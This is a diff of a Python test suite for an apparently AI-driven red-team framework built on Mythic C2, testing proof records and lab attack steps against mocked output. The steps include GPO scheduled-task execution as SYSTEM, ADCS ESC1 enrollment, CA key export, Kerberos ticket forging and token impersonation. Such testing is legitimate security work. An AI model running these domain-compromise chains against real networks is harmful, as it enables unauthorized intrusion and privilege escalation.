@@ -17,6 +17,7 @@ import pytest
 sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "ai" / "langgraph"))
 import access_reconciler  # noqa: E402
 import adcs_certificate_materializer  # noqa: E402
+import artifact_secrets  # noqa: E402
 import capabilities  # noqa: E402
 import engagement_state  # noqa: E402
 import engagement_ledger  # noqa: E402
@@ -24,13 +25,83 @@ import intent_classifier  # noqa: E402
 import mythic_capability_adapter  # noqa: E402
 import mythic_tools  # noqa: E402
 import prompt_loader  # noqa: E402
+import proof_boundary  # noqa: E402
 from mythic_tools import MythicTools  # noqa: E402
 
 
 def _make_tools() -> MythicTools:
     mt = MythicTools(agent_task_id="test")
     mt.client = object()
+    _arm_runtime_lineage(mt)
     return mt
+
+
+def _arm_runtime_lineage(mt, task_id="4242", callback_id="50", command="test-command"):
+    mt._last_issued_task_display_id = task_id
+    mt._last_issued_callback_id = callback_id
+    mt._last_issued_task_terminal_status = "completed"
+    mt._last_issued_command = command
+
+
+def _record_success(mt, output):
+    mt._record_engagement_success(
+        output,
+        task_id=mt._last_issued_task_display_id,
+        callback_id=mt._last_issued_callback_id,
+        terminal_status=mt._last_issued_task_terminal_status,
+        command=mt._last_issued_command,
+    )
+
+
+def _task_proof(task_id, callback_id="13", *, engagement_id=None, command="test-command", verifier_id="test:fixture"):
+    return proof_boundary.make_runtime_task_envelope(
+        engagement_id=engagement_id or mythic_tools.SAGE_ENGAGEMENT_ID,
+        callback_id=callback_id or "13",
+        task_id=task_id,
+        terminal_status="completed",
+        command=command,
+        verifier_id=verifier_id,
+        captured_at="2026-06-12T12:00:00Z",
+        transaction_id=f"fixture:{task_id}",
+        verifier_input={"fixture": verifier_id, "task_id": str(task_id)},
+        verifier_result={"verified": True},
+    ).to_dict()
+
+
+def _artifact_proof(path: Path, *, engagement_id="test-op", callback_id="13", task_id="9000", artifact_id="artifact-ca-1"):
+    return proof_boundary.make_runtime_artifact_envelope(
+        engagement_id=engagement_id,
+        callback_id=callback_id,
+        task_id=task_id,
+        terminal_status="completed",
+        command="download",
+        artifact_id=artifact_id,
+        artifact_sha256=hashlib.sha256(path.read_bytes()).hexdigest(),
+        verifier_id="test:ca-artifact",
+        captured_at="2026-06-12T12:00:00Z",
+        transaction_id=f"fixture:{task_id}",
+        verifier_input={"fixture": "test:ca-artifact", "task_id": str(task_id)},
+        verifier_result={"verified": True},
+    ).to_dict()
+
+
+def _bloodhound_proof(task_id, callback_id="13", *, engagement_id=None):
+    return proof_boundary.make_runtime_bloodhound_envelope(
+        engagement_id=engagement_id or mythic_tools.SAGE_ENGAGEMENT_ID,
+        callback_id=callback_id or "13",
+        task_id=task_id,
+        terminal_status="completed",
+        command="download",
+        ingest_job_id=f"bh-job-{task_id}",
+        ingest_status="complete",
+        source_artifact_id=f"artifact-{task_id}",
+        source_artifact_sha256="a" * 64,
+        verifier_id="test:bloodhound-ingest",
+        captured_at="2026-06-12T12:00:00Z",
+        transaction_id=f"fixture:{task_id}",
+        verifier_input={"fixture": "test:bloodhound-ingest", "task_id": str(task_id)},
+        verifier_result={"verified": True},
+    ).to_dict()
 
 
 @contextmanager
@@ -89,9 +160,13 @@ def _seeded_reconcile(mt: MythicTools):
 
 
 def _proof_hop(effect, task_id, callback_id="", technique="capability:seed", target="seed"):
-    evidence = {"mythic_task_id": task_id, "source": "test"}
-    if callback_id:
-        evidence["callback_id"] = callback_id
+    proof = _task_proof(task_id, callback_id or "13")
+    evidence, admission = proof_boundary.attach_proof(
+        {"source": "test"},
+        proof_boundary.ProofEnvelope.from_dict(proof),
+        current_engagement_id=mythic_tools.SAGE_ENGAGEMENT_ID,
+    )
+    assert admission.admitted
     return engagement_state.Hop(
         id=f"{technique}:{target}",
         technique=technique,
@@ -103,7 +178,37 @@ def _proof_hop(effect, task_id, callback_id="", technique="capability:seed", tar
         satisfied_effects=[effect],
         source="test",
         timestamp="2026-06-12T12:00:00Z",
+        proof_envelope=proof,
     )
+
+
+def _ca_artifact_hop(path: Path, *, engagement_id="test-op", callback_id="13", task_id="9000"):
+    proof = _artifact_proof(
+        path,
+        engagement_id=engagement_id,
+        callback_id=callback_id,
+        task_id=task_id,
+    )
+    evidence, admission = proof_boundary.attach_proof(
+        {
+            "artifact_present": True,
+            "verify_verdict": "achieved",
+            "pfx_artifact_path": str(path),
+            "pfx_artifact_id": proof["artifact_id"],
+            "pfx_artifact_sha256": proof["artifact_sha256"],
+        },
+        proof_boundary.ProofEnvelope.from_dict(proof),
+        current_engagement_id=engagement_id,
+    )
+    assert admission.admitted
+    return {
+        "id": "capability:adcs-ca-private-key-export:target=ca01;target_domain=lab.local;callback=13",
+        "effect": "adcs-ca-private-key:ca01@lab.local",
+        "status": "achieved",
+        "satisfied_effects": ["adcs-ca-private-key:ca01@lab.local"],
+        "evidence": evidence,
+        "proof_envelope": proof,
+    }
 
 
 def _bloodhound_zip_bytes() -> bytes:
@@ -152,6 +257,7 @@ def _write_test_ca_artifact(path: Path) -> Path:
         .sign(key, hashes.SHA256())
     )
     path.parent.mkdir(parents=True, exist_ok=True)
+    path.parent.chmod(0o700)
     path.write_bytes(
         key.private_bytes(
             serialization.Encoding.PEM,
@@ -160,6 +266,7 @@ def _write_test_ca_artifact(path: Path) -> Path:
         )
         + cert.public_bytes(serialization.Encoding.PEM)
     )
+    path.chmod(0o600)
     return path
 
 
@@ -184,6 +291,7 @@ def _write_test_ca_pfx(path: Path, password: str = "") -> Path:
             serialization.NoEncryption()
         ),
     ))
+    path.chmod(0o600)
     return path
 
 
@@ -210,6 +318,50 @@ def test_issue_task_decodes_bytes_output_before_downstream_processing():
 
     assert result == raw.decode("utf-8")
     assert not result.startswith("b'")
+
+
+def test_accepted_mythic_task_emits_boundary_lifecycle_events():
+    mt = _make_tools()
+    events = []
+    mt.set_execution_observer(events.append)
+
+    with _split_issue("NORTH\\arya", display_id=4242):
+        result = asyncio.run(mt.issue_task_and_waitfor_task_output("whoami", "", 11))
+
+    assert result == "NORTH\\arya"
+    assert [event["status"] for event in events] == ["started", "completed"]
+    assert {event["event_id"] for event in events} == {"mythic-task:11:4242"}
+    assert events[0]["tool_name"] == "whoami"
+    assert events[0]["task_id"] == 4242
+    assert events[1]["result_preview"] == "NORTH\\arya"
+    assert events[1]["output"] == "NORTH\\arya"
+
+
+def test_mythic_task_event_inherits_policy_decision_provenance():
+    mt = _make_tools()
+    events = []
+    mt.set_execution_observer(events.append)
+    policy_decision = {
+        "episode_id": "episode-1",
+        "decision_id": "decision-1",
+        "policy_mode": "llm",
+    }
+
+    with _split_issue("NORTH\\arya", display_id=4242):
+        asyncio.run(mt.issue_task_and_waitfor_task_output(
+            "whoami",
+            "",
+            11,
+            visibility_context={
+                "capability": "prove-access",
+                "purpose": "verify identity",
+                "policy_decision": policy_decision,
+            },
+        ))
+
+    assert events[0]["episode_id"] == "episode-1"
+    assert events[0]["decision_id"] == "decision-1"
+    assert events[0]["policy_mode"] == "llm"
 
 
 def test_issue_task_refuses_dead_callback_before_mythic_tasking():
@@ -636,13 +788,19 @@ def test_stage_b_collect_graph_skip_requires_graph_corroboration(monkeypatch):
     async def fake_tasks(*args, **kwargs):
         return []
 
+    proof = _bloodhound_proof(779, callback_id="50")
     achieved = engagement_state.record_hop_result(
-        engagement_state.EngagementState(objective="test"),
+        engagement_state.EngagementState(
+            objective="test",
+            engagement_id=mythic_tools.SAGE_ENGAGEMENT_ID,
+            runtime_scope=True,
+        ),
         "collect-graph",
         access_key,
         "achieved",
         {"source": "ingest_collection", "graph_verified": True},
         "2026-06-17T00:00:00Z",
+        proof_envelope=proof,
     )
 
     mt = _make_tools()
@@ -673,6 +831,7 @@ def test_stage_b_collect_graph_skip_requires_graph_corroboration(monkeypatch):
             "bloodhound:domain_info",
             "2026-06-17T00:00:00Z",
             600,
+            proof_envelope=proof,
         )
     ]
     calls2 = {"issue": 0}
@@ -703,8 +862,13 @@ def test_operator_requested_collection_overrides_same_scope_graph_skip(monkeypat
     async def fake_tasks(*args, **kwargs):
         return []
 
+    proof = _bloodhound_proof(779, callback_id="50")
     achieved = engagement_state.record_hop_result(
-        engagement_state.EngagementState(objective="test"),
+        engagement_state.EngagementState(
+            objective="test",
+            engagement_id=mythic_tools.SAGE_ENGAGEMENT_ID,
+            runtime_scope=True,
+        ),
         "collect-graph",
         access_key,
         "achieved",
@@ -714,6 +878,7 @@ def test_operator_requested_collection_overrides_same_scope_graph_skip(monkeypat
             "covered_domains": ["north.sevenkingdoms.local"],
         },
         "2026-06-17T00:00:00Z",
+        proof_envelope=proof,
     )
 
     mt = _make_tools()
@@ -778,6 +943,27 @@ def test_operator_requested_collection_rejects_historical_ingest_before_new_laun
     assert result["status"] == "fresh_collection_required"
     assert result["operator_requested_recollection"] is True
     assert "historical ZIP" in result["error"]
+
+
+def test_ingest_collection_no_download_reports_non_retryable_fresh_collection_path(monkeypatch):
+    mt = _make_tools()
+
+    async def fake_latest_download(callback_display_id, name_contains):
+        return None
+
+    async def fake_sleep(*_args, **_kwargs):
+        return None
+
+    monkeypatch.setattr(mt, "_latest_download_for_callback", fake_latest_download)
+    monkeypatch.setattr(mythic_tools.asyncio, "sleep", fake_sleep)
+
+    result = json.loads(asyncio.run(mt.ingest_collection(callback_display_id=1)))
+
+    assert result["status"] == "no_collection_artifact"
+    assert result["retryable_by_reingest"] is False
+    assert "no existing collection artifact" in result["error"]
+    assert "Do not retry ingest_collection" in result["next_action"]
+    assert "run one fresh SharpHound/AzureHound collection" in result["next_action"]
 
 
 def test_operator_requested_collection_rejects_wrong_zip_after_new_launch(monkeypatch):
@@ -947,7 +1133,7 @@ def test_ticket_gate_allows_builder_emitted_managed_kerberos_forge_command():
     assert hop.technique == "sid-history-escalation"
     assert hop.status == "achieved"
     assert hop.evidence["verified_on_record"] is True
-    assert hop.evidence["mythic_task_id"] == 5150
+    assert hop.evidence["mythic_task_id"] == "5150"
 
 
 def test_ensure_kerberos_context_forge_is_not_skipped_by_durable_da():
@@ -1088,8 +1274,8 @@ def test_deterministic_ensure_context_service_proof_records_callback_effect():
     }
     hop = mt._engagement_hops[-1]
     assert hop.technique == "capability:ensure-kerberos-context"
-    assert hop.evidence["mythic_task_id"] == 6161
-    assert hop.evidence["callback_id"] == 13
+    assert hop.evidence["mythic_task_id"] == "6161"
+    assert hop.evidence["callback_id"] == "13"
 
 
 def test_ticket_gate_blocks_builder_shaped_command_not_emitted_by_builder():
@@ -1158,7 +1344,7 @@ def test_gate_proceed_records_gpo_setup_as_pending_until_system_proof():
     assert hop.status == "pending"
     assert hop.evidence["verify_verdict"] == "partial"
     # The hop must capture the Mythic task display_id that created the setup artifact.
-    assert hop.evidence.get("mythic_task_id") == 2712
+    assert hop.evidence.get("mythic_task_id") == "2712"
 
 
 def test_gate_proceed_annotates_gpo_guid_only_noop():
@@ -1191,7 +1377,7 @@ def test_gate_proceed_annotates_gpo_guid_only_noop():
     assert hop.target == "starkwallpaper"
     assert hop.status == "failed"
     assert hop.evidence["verify_verdict"] == "failed"
-    assert hop.evidence.get("mythic_task_id") == 2713
+    assert hop.evidence.get("mythic_task_id") == "2713"
 
 
 def test_record_engagement_success_records_domain_admin_membership_probe():
@@ -1213,7 +1399,7 @@ The command completed successfully.
 """
 
     with patch.object(mt, "_persist_engagement_ledger") as persist:
-        mt._record_engagement_success(output)
+        _record_success(mt, output)
 
     persist.assert_called_once()
     assert len(mt._engagement_hops) == 1
@@ -1224,7 +1410,7 @@ The command completed successfully.
     assert hop.status == "achieved"
     assert hop.evidence["verified_on_record"] is True
     assert hop.evidence["artifact_present"] is True
-    assert hop.evidence["mythic_task_id"] == 282
+    assert hop.evidence["mythic_task_id"] == "282"
 
 
 def test_extract_domain_admin_membership_probe_accepts_net_user_global_group_membership():
@@ -1259,6 +1445,7 @@ The command completed successfully.
 
 def test_record_capability_result_bridge_records_and_persists():
     mt = _make_tools()
+    _arm_runtime_lineage(mt, task_id=31337)
     action = capabilities.CapabilityAction(
         name="grant-directory-rights",
         target="domain=lab.local;source=gpo-system-exec:workstation-policy",
@@ -1274,7 +1461,13 @@ def test_record_capability_result_bridge_records_and_persists():
             action,
             {"ds_replication_rights": True},
             now="2026-06-10T13:00:00Z",
-            evidence={"mythic_task_id": 31337},
+            evidence={
+                "mythic_task_id": 31337,
+                "callback_id": "50",
+                "transaction_id": "fixture:31337",
+                "terminal_task_status": "completed",
+                "command": "test-command",
+            },
         )
 
     assert verification.verdict == "achieved"
@@ -1285,7 +1478,46 @@ def test_record_capability_result_bridge_records_and_persists():
     assert hop.status == "achieved"
     assert hop.effect == "ds-replication-rights:lab.local"
     assert hop.evidence["verify_verdict"] == "achieved"
-    assert hop.evidence["mythic_task_id"] == 31337
+    assert hop.evidence["mythic_task_id"] == "31337"
+
+
+def test_record_graph_built_persists_policy_decision_provenance():
+    mt = _make_tools()
+    mt._engagement_footholds = [_foothold()]
+    token = mythic_tools._task_visibility_context.set({
+        "capability": "collect-graph",
+        "policy_decision": {
+            "episode_id": "episode-collect",
+            "decision_id": "decision-collect",
+            "policy_mode": "llm",
+            "candidate_hash": "sha256:collect",
+            "candidate_count": 1,
+            "selected_index": 0,
+            "selected_family": "collection",
+            "selected_is_first_admissible": True,
+            "disposition": "select",
+            "raw_response": '{"disposition":"select","capability":"collect-graph"}',
+            "raw_disposition": "select",
+            "raw_rationale": "only legal first step",
+            "model_response_observed": True,
+            "effective_backend": "runtime-provider:runtime-model",
+            "backend_provenance_source": "response_metadata.model_name",
+        },
+    })
+    try:
+        with patch.object(mt, "_persist_engagement_ledger") as persist:
+            asyncio.run(mt._record_graph_built("50", True, covered_domains=["north.local"]))
+    finally:
+        mythic_tools._task_visibility_context.reset(token)
+
+    persist.assert_called_once()
+    hop = mt._engagement_hops[0]
+    assert hop.technique == "collect-graph"
+    assert hop.evidence["decision_id"] == "decision-collect"
+    assert hop.evidence["selected_family"] == "collection"
+    assert hop.evidence["selected_is_first_admissible"] is True
+    assert hop.evidence["raw_disposition"] == "select"
+    assert hop.evidence["effective_backend"] == "runtime-provider:runtime-model"
 
 
 def test_build_capability_execution_plan_bridge_delegates_to_pure_builder():
@@ -1804,7 +2036,9 @@ def test_build_capability_commands_dc_scoped_sparse_gpo_defaults_to_group_add():
     assert plan["commands"][-1]["expected_probe"] == "extract_gpo_domain_admin_membership_probe"
 
 
-def test_gpo_proof_target_defaults_to_sysvol_when_current_callback_not_affected_host():
+def test_gpo_proof_target_defaults_to_sysvol_when_current_callback_not_affected_host(monkeypatch):
+    monkeypatch.setenv("SAGE_GPO_PROOF_SHARE_NAME", "SageProof")
+    monkeypatch.setenv("SAGE_GPO_PROOF_LOCAL_ROOT", r"C:\SageProof")
     mt = _make_tools()
     mt._engagement_footholds = [
         engagement_state.Foothold(
@@ -1843,6 +2077,118 @@ def test_gpo_proof_target_defaults_to_sysvol_when_current_callback_not_affected_
         r"\{0a93e998-2599-4da8-9717-6744993ded3a}"
         r"\Machine\Preferences\ScheduledTasks\sage_gpo_starkwallpaper_whoami.txt"
     )
+
+
+def test_gpo_proof_target_uses_dedicated_share_for_remote_non_dc_host(monkeypatch):
+    monkeypatch.setenv("SAGE_GPO_PROOF_SHARE_NAME", "SageProof")
+    monkeypatch.setenv("SAGE_GPO_PROOF_LOCAL_ROOT", r"C:\SageProof")
+    mt = _make_tools()
+    mt._engagement_footholds = [
+        engagement_state.Foothold(
+            callback_id="3",
+            agent="apollo",
+            host="WS01",
+            forest="range.local",
+            identity=r"RANGE\user1",
+            integrity="medium",
+            alive=True,
+            source="test",
+            timestamp="2026-07-12T20:00:00Z",
+        )
+    ]
+    action = capabilities.CapabilityAction(
+        name="gpo-controlled-system-exec",
+        target="gpo=srv02-policy;domain=range.local",
+        preconditions=[],
+        effects=["system-exec:gpo:srv02-policy@range.local"],
+        intent={
+            "capability": "gpo-controlled-system-exec",
+            "domain": "range.local",
+            "gpo": "srv02-policy",
+            "affected_hosts": ["srv02"],
+            "affected_dc_hosts": [],
+        },
+    )
+    inputs = {"callback_id": 3}
+
+    asyncio.run(mt._augment_capability_runtime_inputs(action, inputs))
+    asyncio.run(mt._ensure_capability_executor_proof_target(action, inputs))
+
+    assert inputs["current_host"] == "WS01"
+    assert inputs["proof_path"] == r"C:\SageProof\sage_gpo_srv02_policy_whoami.txt"
+    assert inputs["proof_unc"] == r"\\srv02.range.local\SageProof\sage_gpo_srv02_policy_whoami.txt"
+
+
+def test_adcs_esc_enroll_runtime_inputs_use_scoped_eval_hint(monkeypatch):
+    monkeypatch.setenv(
+        "SAGE_EVAL_ADCS_ESC_ENROLLMENT_HINTS_JSON",
+        json.dumps([{
+            "domain": "lab.local",
+            "ca_host": "ca01",
+            "ca_name": r"ca01.lab.local\LAB-CA",
+            "template": "VulnerableUser",
+            "esc_type": "esc1",
+        }]),
+    )
+    mt = _make_tools()
+    action = capabilities.CapabilityAction(
+        name="adcs-esc-certificate-enroll",
+        target="domain=lab.local;account=administrator;ca_host=ca01;callback=13",
+        preconditions=["adcs-ca-key-export-blocked:ca01@lab.local", "live-callback:13"],
+        effects=["adcs-enrolled-certificate:administrator@lab.local"],
+        intent={
+            "capability": "adcs-esc-certificate-enroll",
+            "domain": "lab.local",
+            "account": "administrator",
+            "ca_host": "ca01",
+            "callback_id": "13",
+        },
+    )
+    inputs = {"callback_id": "13"}
+
+    asyncio.run(mt._augment_capability_runtime_inputs(action, inputs))
+
+    assert inputs["ca_name"] == r"ca01.lab.local\LAB-CA"
+    assert inputs["template"] == "VulnerableUser"
+    assert inputs["esc_type"] == "esc1"
+    assert inputs["adcs_esc_enrollment_hint_source"] == "SAGE_EVAL_ADCS_ESC_ENROLLMENT_HINTS_JSON"
+
+
+def test_adcs_esc_enroll_runtime_inputs_do_not_override_explicit_or_mismatched_hint(monkeypatch):
+    monkeypatch.setenv(
+        "SAGE_EVAL_ADCS_ESC_ENROLLMENT_HINTS_JSON",
+        json.dumps([{
+            "domain": "other.local",
+            "ca_host": "ca99",
+            "ca_name": r"ca99.other.local\OTHER-CA",
+            "template": "OtherTemplate",
+        }]),
+    )
+    mt = _make_tools()
+    action = capabilities.CapabilityAction(
+        name="adcs-esc-certificate-enroll",
+        target="domain=lab.local;account=administrator;ca_host=ca01;callback=13",
+        preconditions=["adcs-ca-key-export-blocked:ca01@lab.local", "live-callback:13"],
+        effects=["adcs-enrolled-certificate:administrator@lab.local"],
+        intent={
+            "capability": "adcs-esc-certificate-enroll",
+            "domain": "lab.local",
+            "account": "administrator",
+            "ca_host": "ca01",
+            "callback_id": "13",
+        },
+    )
+    inputs = {
+        "callback_id": "13",
+        "ca_name": r"ca01.lab.local\EXPLICIT-CA",
+        "template": "ExplicitTemplate",
+    }
+
+    asyncio.run(mt._augment_capability_runtime_inputs(action, inputs))
+
+    assert inputs["ca_name"] == r"ca01.lab.local\EXPLICIT-CA"
+    assert inputs["template"] == "ExplicitTemplate"
+    assert "adcs_esc_enrollment_hint_source" not in inputs
 
 
 def test_gpo_proof_target_preserves_explicit_action_proof_path():
@@ -2350,7 +2696,7 @@ def test_execute_capability_gpo_direct_valid_xml_system_author_does_not_close_ef
     assert waits == [1]
     assert [call["command_name"] for call in calls["issued"]] == ["execute_assembly", "shell", "shell"]
     assert result["issued"][1]["expected_probe"] == "extract_gpo_system_exec_probe"
-    assert result["issued"][1]["verify_verdict"] == "achieved"
+    assert result["issued"][1]["verify_verdict"] == "partial"
     assert result["issued"][-1]["expected_probe"] == "extract_gpo_domain_admin_membership_probe"
     assert result["issued"][-1]["verify_verdict"] == "achieved"
     assert [call["command_name"] for call in calls["issued"]].count("execute_assembly") == 1
@@ -2359,7 +2705,7 @@ def test_execute_capability_gpo_direct_valid_xml_system_author_does_not_close_ef
         if event["stage"] == "effect_verification"
     ]
     assert any(
-        event["final_probe"] is False and event["verdict"] == "achieved"
+        event["final_probe"] is False and event["verdict"] == "partial"
         for event in verification_events
     )
     assert verification_events[-1]["final_probe"] is True
@@ -2369,6 +2715,67 @@ def test_execute_capability_gpo_direct_valid_xml_system_author_does_not_close_ef
         if "system-exec:gpo:starkwallpaper@north.sevenkingdoms.local" in hop.satisfied_effects
     )
     assert hop.evidence["source"] == "execute_capability"
+
+
+def test_execute_capability_gpo_proof_only_does_not_inherit_system_author_from_xml(monkeypatch):
+    monkeypatch.setenv("SAGE_TRAJECTORY_DISABLE", "1")
+    mt = _make_tools()
+    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
+    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)
+    mt._engagement_footholds = [
+        engagement_state.Foothold(
+            callback_id="3",
+            agent="apollo",
+            host="CASTELBLACK",
+            forest="north.sevenkingdoms.local",
+            identity="NORTH\\samwell.tarly",
+            integrity="medium",
+            alive=True,
+            source="test",
+            timestamp="2026-06-15T20:00:00Z",
+        )
+    ]
+
+    async def fake_sleep(seconds, result=None):
+        return result
+
+    monkeypatch.setattr(mythic_tools.asyncio, "sleep", fake_sleep)
+    valid_xml = (
+        "<ScheduledTasks><Task><Properties><Author>NT AUTHORITY\\SYSTEM</Author>"
+        "<Arguments>/c whoami &gt; C:\\Users\\Public\\sage_gpo_starkwallpaper_whoami.txt</Arguments>"
+        "</Properties></Task></ScheduledTasks>"
+    )
+    outputs = iter([
+        "GPO was modified successfully",
+        valid_xml,
+        "The system cannot find the file specified.",
+    ])
+    calls = {}
+
+    with patch.object(access_reconciler, "reconcile_access", _seeded_reconcile(mt)), \
+        _split_issue(lambda: next(outputs), calls, display_id=3141):
+        raw = asyncio.run(mt.execute_capability(
+            {
+                "capability": "gpo-controlled-system-exec",
+                "domain": "north.sevenkingdoms.local",
+                "gpo": "starkwallpaper",
+                "gpo_guid": "{0A93E998-2599-4DA8-9717-6744993DED3A}",
+                "callback_id": 3,
+            },
+            {
+                "callback_id": 3,
+                "allow_proof_only": True,
+                "wait_seconds": 1,
+                "proof_retries": 0,
+            },
+        ))
+
+    result = json.loads(raw)
+    assert result["ok"] is False
+    assert result["stopped_after"] == "unresolved_effect_transaction"
+    assert result["issued"][1]["verify_verdict"] == "partial"
+    assert result["issued"][-1]["verify_verdict"] == "partial"
+    assert "system-exec:gpo:starkwallpaper@north.sevenkingdoms.local" not in mt._capability_achieved_effects()
 
 
 def test_execute_capability_gpo_direct_missing_membership_pins_transaction(monkeypatch):
@@ -2694,7 +3101,7 @@ def test_build_capability_commands_selects_account_key_for_account_context():
     assert plan["commands"][-1]["parameters"] == "dir \\\\dc01.lab.local\\SYSVOL"
 
 
-def test_deterministic_account_context_records_only_after_account_ticket_and_service_proof():
+def test_deterministic_account_context_records_only_after_logon_ticket_and_service_proof():
     mt = _make_tools()
 
     async def no_schema(command, callback_display_id):
@@ -2716,6 +3123,7 @@ def test_deterministic_account_context_records_only_after_account_ticket_and_ser
         },
     )
     action_dict = asdict(action)
+    logon_params = {"credential": "@cred:88", "netOnly": True}
     list_params = {"luid": ""}
     proof_params = "dir \\\\dc01.lab.local\\SYSVOL"
     base_context = {
@@ -2726,6 +3134,12 @@ def test_deterministic_account_context_records_only_after_account_ticket_and_ser
         "action": action_dict,
         "produces": [],
         "consumes": [],
+    }
+    mt._deterministic_capability_command_contexts[
+        mythic_tools._capability_command_key("make_token", logon_params)
+    ] = {
+        **base_context,
+        "expected_probe": "extract_logon_context_probe",
     }
     mt._deterministic_capability_command_contexts[
         mythic_tools._capability_command_key("ticket_store_list", list_params)
@@ -2745,6 +3159,11 @@ def test_deterministic_account_context_records_only_after_account_ticket_and_ser
     ticket_list = "Cached Tickets\nClient: alice @ LAB.LOCAL\nServer: krbtgt/LAB.LOCAL"
     proof_output = " Directory of \\\\dc01.lab.local\\SYSVOL\r\nPolicies\r\nThe command completed successfully."
 
+    with _split_issue(
+        "Successfully set Primary Identity for local access and Impersonation Identity for remote access.",
+        display_id=7000,
+    ):
+        asyncio.run(mt.issue_task_and_waitfor_task_output("make_token", logon_params, 13, timeout=5))
     with _split_issue(ticket_list, display_id=7001):
         asyncio.run(mt.issue_task_and_waitfor_task_output("ticket_store_list", list_params, 13, timeout=5))
     with _split_issue(proof_output, display_id=7002):
@@ -2756,8 +3175,8 @@ def test_deterministic_account_context_records_only_after_account_ticket_and_ser
     }
     hop = mt._engagement_hops[-1]
     assert hop.technique == "capability:ensure-account-kerberos-context"
-    assert hop.evidence["mythic_task_id"] == 7002
-    assert hop.evidence["callback_id"] == 13
+    assert hop.evidence["mythic_task_id"] == "7002"
+    assert hop.evidence["callback_id"] == "13"
 
 
 def test_rubeus_klist_output_marks_expected_account_ticket_context():
@@ -2777,6 +3196,17 @@ def test_execute_capability_account_context_accumulates_ticket_cache_and_service
     mt = _make_tools()
     mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
     mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)
+    record_command_result = mt._record_deterministic_capability_command_result
+
+    def record_with_mythic_make_token_parameter_rewrite(command, parameters, callback_display_id, output, **kwargs):
+        if command != "make_token":
+            record_command_result(command, parameters, callback_display_id, output, **kwargs)
+
+    monkeypatch.setattr(
+        mt,
+        "_record_deterministic_capability_command_result",
+        record_with_mythic_make_token_parameter_rewrite,
+    )
 
     async def fake_fetch_credentials(now):
         return [
@@ -2794,7 +3224,7 @@ def test_execute_capability_account_context_accumulates_ticket_cache_and_service
     mt._resolve_domain_controller_host = lambda domain: asyncio.sleep(0, result="dc01.lab.local")
     ticket = base64.b64encode(b"A" * 80).decode()
     outputs = iter([
-        "No tickets in current context.",
+        "Cached Tickets\r\nClient: alice @ LAB.LOCAL\r\nServer: krbtgt/lab.local @ LAB.LOCAL\r\n",
         " Directory of \\\\dc01.lab.local\\SYSVOL\r\nPolicies\r\nThe command completed successfully.",
         f"[*] Action: Ask TGT\n[*] base64(ticket.kirbi):\n{ticket}\n",
         "Successfully impersonated local\\user for local access and lab.local\\alice for remote access.",
@@ -2819,7 +3249,7 @@ def test_execute_capability_account_context_accumulates_ticket_cache_and_service
             },
         )))
 
-    assert result["ok"] is True, result
+    assert result["ok"] is True, json.dumps(result, indent=2)
     assert result["verdict"] == "achieved"
     assert calls["issue"] == 7
     issued_params = [str(call["parameters"]) for call in calls["issued"]]
@@ -2830,6 +3260,181 @@ def test_execute_capability_account_context_accumulates_ticket_cache_and_service
     final_probe = mt._engagement_hops[-1].evidence["probe"]
     assert final_probe["account_ticket_present"] is True
     assert final_probe["service_access_proven"] is True
+    context_key = mt._kerberos_account_context_key(13, "alice", "lab.local")
+    assert context_key in mt._kerberos_logon_account_context_keys
+    assert context_key in mt._kerberos_account_context_keys
+
+
+def test_verified_account_kerberos_context_does_not_borrow_target_domain():
+    mt = _make_tools()
+    action = capabilities.CapabilityAction(
+        name="ensure-account-kerberos-context",
+        target="domain=essos.local;account=administrator;callback=13",
+        preconditions=[],
+        effects=["kerberos-account-context:administrator@sevenkingdoms.local@callback:13"],
+        intent={
+            "capability": "ensure-account-kerberos-context",
+            "domain": "essos.local",
+            "account_domain": "sevenkingdoms.local",
+            "account": "administrator",
+            "callback_id": "13",
+        },
+    )
+
+    assert mt._capability_account_context_domain(action, {}) == "sevenkingdoms.local"
+    key = mt._record_verified_account_kerberos_context(action, {}, 13)
+
+    assert key == mt._kerberos_account_context_key(13, "administrator", "sevenkingdoms.local")
+    assert mt._kerberos_account_context_key(13, "administrator", "essos.local") not in mt._kerberos_account_context_keys
+
+
+def test_deterministic_account_context_bookkeeping_uses_account_home_realm():
+    mt = _make_tools()
+    action = capabilities.CapabilityAction(
+        name="ensure-account-kerberos-context",
+        target="domain=essos.local;account=administrator;callback=13",
+        preconditions=[],
+        effects=["kerberos-account-context:administrator@sevenkingdoms.local@callback:13"],
+        intent={
+            "capability": "ensure-account-kerberos-context",
+            "domain": "essos.local",
+            "account_domain": "sevenkingdoms.local",
+            "account": "administrator",
+            "callback_id": "13",
+        },
+    )
+    logon_params = {"Credential": "@cred:91", "netOnly": True}
+    ticket_params = ""
+    common = {
+        "capability": action.name,
+        "target": action.target,
+        "effects": list(action.effects),
+        "action": asdict(action),
+    }
+    mt._deterministic_capability_command_contexts[
+        mythic_tools._capability_command_key("make_token", logon_params)
+    ] = {**common, "expected_probe": "extract_logon_context_probe"}
+    mt._deterministic_capability_command_contexts[
+        mythic_tools._capability_command_key("ticket_store_list", ticket_params)
+    ] = {**common, "expected_probe": "extract_account_ticket_cache_probe"}
+
+    mt._record_deterministic_capability_command_result(
+        "make_token",
+        logon_params,
+        13,
+        "Successfully impersonated remote identity.",
+    )
+    mt._record_deterministic_capability_command_result(
+        "ticket_store_list",
+        ticket_params,
+        13,
+        (
+            "Cached Tickets\r\n"
+            "Client: administrator @ SEVENKINGDOMS.LOCAL\r\n"
+            "Server: krbtgt/sevenkingdoms.local @ SEVENKINGDOMS.LOCAL\r\n"
+        ),
+    )
+
+    home_key = mt._kerberos_account_context_key(13, "administrator", "sevenkingdoms.local")
+    target_key = mt._kerberos_account_context_key(13, "administrator", "essos.local")
+    assert home_key in mt._kerberos_logon_account_context_keys
+    assert home_key in mt._kerberos_account_context_keys
+    assert target_key not in mt._kerberos_logon_account_context_keys
+    assert target_key not in mt._kerberos_account_context_keys
+
+
+def test_netonly_plaintext_credential_is_created_separately_from_account_key(monkeypatch):
+    mt = _make_tools()
+
+    async def fake_fetch_credentials(now):
+        return [{
+            "id": 32,
+            "account": "alice",
+            "realm": "lab.local",
+            "type": "key",
+            "credential_text": "a" * 64,
+        }]
+
+    created = []
+
+    async def fake_create_credential(client, credential, account, realm, comment, credential_type):
+        created.append({
+            "credential": credential,
+            "account": account,
+            "realm": realm,
+            "comment": comment,
+            "credential_type": credential_type,
+        })
+        return {"status": "success", "id": 88}
+
